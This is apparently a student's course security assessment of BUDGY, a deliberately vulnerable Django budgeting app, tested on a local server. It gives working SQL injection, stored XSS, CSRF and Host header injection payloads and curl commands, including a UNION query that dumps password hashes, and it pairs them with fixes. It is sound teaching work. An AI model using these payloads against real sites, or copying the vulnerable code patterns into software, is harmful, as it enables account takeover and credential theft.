# BUDGY — Web Application Security Assessment

**Course:** CN351 — Web Application Security
**Methodology reference:** *The Web Application Hacker's Handbook*, Chapter 21 — "A Web Application Hacker's Methodology" (see `book.md`)
**Environment:** Local dev server (`python manage.py runserver`, `http://127.0.0.1:8000`) — authorized testing.

---

## 1. Introduction

### 1.1 Overview of the application

BUDGY is a multi-user personal-finance / budget-tracking web application. Users register, log in,
create money accounts, record **income / expense / transfer** transactions, organise them into
categories, search their transaction history, and view dashboards and statistics.

This report analyses four classes of exploitable vulnerability in the application:

| # | Vulnerability | Where |
|---|---------------|-------|
| 1 | SQL Injection | `home/views.py → transaction_history()` |
| 2 | Stored Cross-Site Scripting (XSS) | `transaction_history.html`, `dashboard.html`, `stats.html` |
| 3 | Cross-Site Request Forgery (CSRF) | `settings.py`; `@csrf_exempt` views |
| 4 | Host Header Injection | `authorized/views.py → forgot_password()`; `settings.py` |

Each vulnerability is presented as Chapter 21 prescribes: **describe → locate → apply the
methodology → exploit step by step.**

### 1.2 Technologies used

| Layer | Technology |
|-------|-----------|
| Language | Python 3.12 |
| Framework | Django 5.2 |
| Database | SQLite 3 (dev) / PostgreSQL via `dj_database_url` (prod) |
| Templating | Django Templates (server-side) |
| Frontend | Bootstrap 5.3, Font Awesome, vanilla JS, Chart.js |
| Static serving | WhiteNoise |
| Auth | `django.contrib.auth` (PBKDF2-SHA256 password hashing) |

**How to run:**
```bash
cd budgy
python manage.py migrate
# seed two users (alice/bob) + an admin with sample transactions:
python manage.py shell -c "exec(open('seed_demo.py').read())"
python manage.py runserver
```

| Username | Password | Role |
|----------|----------|------|
| `alice` | `Alice#2025` | user |
| `bob` | `Bob#2025` | user |
| `admin` | `SuperSecret#Admin1` | superuser |

User IDs are sequential integers; after login your ID appears in the redirect URL (e.g. `/5/home/`).

---

## 2. Vulnerability Analysis

### 2.1 SQL Injection

**Description.** The `q` search parameter on the Transaction History page is concatenated directly
into a raw SQL string with no parameterisation or escaping. An attacker can break out of the string
literal and inject arbitrary SQL, including a `UNION SELECT` that reads `auth_user` to dump every
username and password hash.

**Where it exists** — `budgy/home/views.py`, `transaction_history()`:
```python
q = request.GET.get("q", "")
sql = ("SELECT trans_id, trans_type, date, amount, category_trans "
       "FROM home_transaction WHERE user_id = " + str(user_id))
if q:
    sql += " AND category_trans LIKE '%" + q + "%'"   # q injected verbatim
cursor.execute(sql)                                   # raw execution, no parameters
```

**Methodology (Chapter 21 §7.1 Fuzz, §7.2 Test for SQL Injection).**
- **§7.1.1** identifies `q` as a request parameter the server processes — in scope for fuzzing.
- **§7.1.3 / §7.2.2** — the standard payload set starts with a single quote `'`. With `DEBUG=True`,
  that returns a 500 error page leaking the raw SQL and an `OperationalError` — a strong positive
  signal (and information disclosure).
- **§7.2.3 two-single-quote test** — one quote breaks the query; two quotes (`''`) restore normal
  behaviour → "probably vulnerable to SQL injection."
- **§7.2.8 choose an attack** — modify the `WHERE` clause (boolean) to prove logic control, then use
  `UNION` to inject an arbitrary `SELECT` and exfiltrate credentials.

**Step-by-step exploitation.**
1. **Detect** — submit a single quote: `/5/transactions/?q='` → HTTP 500 with `OperationalError`.
   `?q=''` returns a normal page → vulnerable (§7.2.3).
2. **Confirm logic control (boolean)** — `/5/transactions/?q=%' OR '1'='1' -- ` makes the WHERE
   always true, returning all transactions for all users.
3. **Exfiltrate credentials (UNION, 5 columns)** — align the stolen `password` to a text column so
   the template renders it:
   ```
   /5/transactions/?q=%' UNION SELECT NULL, username, NULL, NULL, password FROM auth_user -- 
   ```
   The results table then lists every account's username and PBKDF2 hash:
   ```
   admin   pbkdf2_sha256$1000000$uSGpNeGNTLnHr6WzAvTRGB$PgV+BeNMkAmXf1aMps5pdsGk/FUR...
   alice   pbkdf2_sha256$1000000$tEledjm64QNMBRMo6GzBXt$9Z2rf5B4e3lDqE2RIDyXLwAsIRVk...
   ```
   > The 3rd selected column is Django's `date` field; on SQLite a hash placed there parses to
   > `None`, so the password is aligned to the text column `category_trans` (5th) to render intact.

---

### 2.2 Stored Cross-Site Scripting (XSS)

**Description.** User-controlled text — transaction category names and account names — is rendered
without escaping. A stored payload (e.g. `<script>…</script>`) therefore executes in the browser of
anyone who later views it: a *stored* (persistent) XSS.

**Where it exists.**
- `budgy/home/templates/home/transaction_history.html` — `<td>{{ t.category|safe }}</td>`; the
  `|safe` filter disables Django's auto-escaping.
- `budgy/home/templates/home/dashboard.html` — `box.innerHTML += ... ${acc.name} ...` and
  `${item.category}` build HTML from untrusted strings.
- `budgy/home/templates/home/stats.html` — `${label}` (category name) injected via `innerHTML`.

**Methodology (Chapter 21 §7.1 Fuzz, §7.3 Test for XSS).**
- **§7.3.1 identify reflected parameters** — the category/account value submitted by the user is
  reflected back into the HTML response body → candidate for response injection.
- **§7.3.1.2 locate the input** — it appears as element text (inside `<td>…</td>` / an injected DOM
  node), the simplest XSS context, so a `<script>` tag injected as content will execute.
- **§7.3.2.1 craft for the context** — raw element text needs no attribute/tag breakout; the
  canonical `<script>…</script>` payload suffices.
- **§7.3.2.3 / §7.3.5 verify** — submit and confirm an `alert` fires; because the value is persisted
  and re-served, this is the higher-impact *stored* variant.

**Step-by-step exploitation.**
1. Log in (e.g. as alice). Map the input: the Expense form posts a `category_name`.
2. Create a transaction whose **category name** is the payload:
   ```
   <script>alert(document.cookie)</script>
   ```
3. Open the history page `/5/transactions/`. The cell renders the raw `<script>` tag and the browser
   executes it. The payload persists — it fires for *every* viewer of that row.
4. The same flaw is reachable via account names on the dashboard: create an account named
   `<img src=x onerror=alert(document.domain)>`; opening `/5/dashboard/` fetches `/api/accounts/` and
   injects the name with `innerHTML`, firing the payload.

> The `sessionid` cookie is `HttpOnly`, so `document.cookie` won't leak it, but the script still runs
> inside the victim's session and can call any endpoint — a real payload exfiltrates page contents
> (financial data) or performs actions on the victim's behalf.

---

### 2.3 Cross-Site Request Forgery (CSRF)

**Description.** The site-wide CSRF middleware is commented out and the money-handling views add
`@csrf_exempt`, so no state-changing request requires a token. A malicious website can make a
logged-in victim's browser perform actions on BUDGY without their knowledge.

**Where it exists.**
- `budgy/budgy/settings.py` — `# "django.middleware.csrf.CsrfViewMiddleware"` (middleware disabled).
- `budgy/home/views.py` — `@csrf_exempt` on the category/transaction/settings views.

**Methodology (Chapter 21 §5.9 Check for CSRF).**
- **§5.9.1** — the app relies on an HTTP session cookie, so it may be vulnerable to CSRF.
- **§5.9.2** — review key functionality and find sensitive requests whose parameters an attacker can
  fully predetermine (no session token, no unpredictable data). The "change email" POST to
  `/<id>/settings/` qualifies → "almost certainly vulnerable."
- **§5.9.3** — build an HTML page that issues the request automatically (a hidden POST form
  auto-submitted with JavaScript); while logged in, load the page in the same browser and verify the
  action occurs.

**Step-by-step exploitation.**
1. **Prove no token is required** — logged in as the victim, change their email with no CSRF token
   (a patched app returns `403 CSRF verification failed`):
   ```bash
   curl -b victim_cookies.txt -X POST http://127.0.0.1:8000/1/settings/ \
     --data-urlencode "update_email=1" --data-urlencode "email=attacker@evil.com"
   ```
2. **Weaponise (§5.9.3)** — host `csrf_attack.html`; when a logged-in victim opens it, their email is
   silently changed:
   ```html
   <html><body>
     <form id="x" action="http://127.0.0.1:8000/1/settings/" method="POST">
       <input type="hidden" name="update_email" value="1">
       <input type="hidden" name="email" value="attacker@evil.com">
     </form>
     <script>document.getElementById('x').submit();</script>
   </body></html>
   ```
3. **Take over** — the attacker uses **Forgot Password** on the now-attacker-controlled email and
   resets the victim's password.

> `settings_page` uses `request.user` and ignores the URL number, so `/1/settings/` works for any
> victim. Because Django's default `SameSite=Lax` blocks the cookie on a cross-site `file://` POST,
> serve the page same-site (`python -m http.server 8001` → `http://127.0.0.1:8001/csrf_attack.html`)
> so the session cookie is sent and the missing-token attack succeeds.

---

### 2.4 Host Header Injection

**Description.** The `ALLOWED_HOSTS` setting is set to `["*"]` (accept any host) and the
`forgot_password()` view uses `request.build_absolute_uri()` to construct the password-reset link.
Because Django builds the absolute URI from the incoming `Host` header, an attacker who forges the
`Host` header in a forgot-password request can cause the reset link to point to an attacker-controlled
server. When the victim clicks the link in their email, the valid reset token is sent to the attacker.

**Where it exists.**
- `budgy/budgy/settings.py` line 29 — `ALLOWED_HOSTS = ["*"]` (no host validation).
- `budgy/authorized/views.py`, `forgot_password()` lines 121–123:
```python
reset_link = request.build_absolute_uri(
    reverse("reset_password", kwargs={"uidb64": uid, "token": token})
)
```

**Methodology (Chapter 21 §7.1 Fuzz, §5.4 Test for Host Header Attacks).**
- **§7.1.1** identifies the `Host` header as an input the server processes — in scope for
  manipulation.
- **§5.4.1** — submit a request with a forged `Host` header (e.g. `Host: evil.com`). If the server
  returns `200 OK` instead of `400 Bad Request`, the host is not validated → vulnerable.
- **§5.4.2** — check if any server-generated URLs (password-reset links, absolute URLs in emails)
  incorporate the `Host` header. If they do, an attacker can poison those links to redirect the
  victim to an attacker-controlled domain.

**Step-by-step exploitation.**
1. **Verify Host acceptance** — send a GET request with a forged Host:
   ```bash
   curl -H "Host: evil.com" http://127.0.0.1:8000/login/
   ```
   Returns HTTP 200 → `ALLOWED_HOSTS = ["*"]` confirmed, no host validation.

2. **Send poisoned forgot-password request** — POST to `/forgot-password/` with the victim's email
   and a forged `Host` header pointing to the attacker's capture server:
   ```bash
   curl -X POST http://127.0.0.1:8000/forgot-password/ \
     -H "Host: 127.0.0.1:8002" \
     --data-urlencode "email=alice@example.com"
   ```
   Budgy generates a reset link using `request.build_absolute_uri()`, which reads the forged Host.
   The link in the email becomes:
   ```
   http://127.0.0.1:8002/reset/<uidb64>/<token>/
   ```
   instead of `http://127.0.0.1:8000/reset/<uidb64>/<token>/`.

3. **Capture the token** — run a capture server on `127.0.0.1:8002`. When the victim clicks the
   poisoned reset link, the valid token arrives at the attacker's server.

4. **Replay the token** — the attacker submits the captured token to the real Budgy server:
   ```bash
   curl -X POST http://127.0.0.1:8000/reset/<uidb64>/<token>/ \
     --data-urlencode "password=AttackerPassword123" \
     --data-urlencode "confirm=AttackerPassword123"
   ```
   The victim's password is now changed → full account takeover.

> This attack requires email delivery to be configured. The PoC demonstrates that the forged `Host`
> header is accepted and the poisoned link is generated correctly.

---

## 3. Mitigation Strategies

### 3.1 SQL Injection

**Fix — never build SQL by string concatenation. Use the ORM, or parameterised queries** so the
driver binds values separately from the SQL text:
```python
# Best: the ORM parameterises automatically
rows = Transaction.objects.filter(user=request.user, category_trans__icontains=q)

# If raw SQL is required, bind parameters — do NOT concatenate:
cursor.execute("SELECT trans_id, trans_type, date, amount, category_trans "
               "FROM home_transaction WHERE user_id = %s AND category_trans LIKE %s",
               [request.user.id, f"%{q}%"])
```
**Best practices:** parameterised queries everywhere; least-privilege database account; input
validation as defence-in-depth; and `DEBUG=False` in production so SQL errors don't leak and the
client only sees a generic error.

### 3.2 Stored XSS

**Fix — never use `|safe` on user-controlled data; let Django auto-escape, and build DOM text with
`textContent`, not `innerHTML`:**
```django
<td>{{ t.category }}</td>   {# auto-escaped: <script> becomes &lt;script&gt; #}
```
```js
const td = document.createElement("td"); td.textContent = item.category;
```
**Best practices:** rely on contextual output encoding (Django auto-escaping); reserve
`|safe`/`mark_safe` for content you generate, never user input; sanitise rich text server-side with a
vetted library (e.g. `bleach`) if HTML must be allowed; add a `Content-Security-Policy` header to
block inline scripts; set `HttpOnly` and `Secure` on session cookies.

### 3.3 CSRF

**Fix — re-enable CSRF protection across the application:** uncomment
`django.middleware.csrf.CsrfViewMiddleware`, remove every `@csrf_exempt`, add `{% csrf_token %}` to
each form, and send the `X-CSRFToken` header on `fetch()`/AJAX calls.

**Best practices:** require an unpredictable, per-session CSRF token on all state-changing requests
(§5.9.2); set `SameSite=Strict`/`Lax` and `Secure` on cookies as defence-in-depth; for the most
sensitive actions (email/password change) re-authenticate or confirm out-of-band.

### 3.4 Host Header Injection

**Fix — restrict `ALLOWED_HOSTS` and never trust the `Host` header for link generation:**
```python
# settings.py — only allow the actual domain(s)
ALLOWED_HOSTS = ["127.0.0.1", "localhost", "budgy.example.com"]
```
For password-reset links, build the URL from a configured `SITE_URL` setting rather than
`request.build_absolute_uri()`:
```python
# settings.py
SITE_URL = "https://budgy.example.com"

# views.py
from django.conf import settings
reset_link = settings.SITE_URL + reverse("reset_password",
    kwargs={"uidb64": uid, "token": token})
```
**Best practices:** set `ALLOWED_HOSTS` to a strict whitelist of production domains; never use
`["*"]`; use Django's `django.contrib.sites` framework or a `SITE_URL` config for building absolute
URLs; in a reverse-proxy setup, trust `X-Forwarded-Host` only from known proxies via
`SECURE_PROXY_SSL_HEADER` and `USE_X_FORWARDED_HOST = False`.
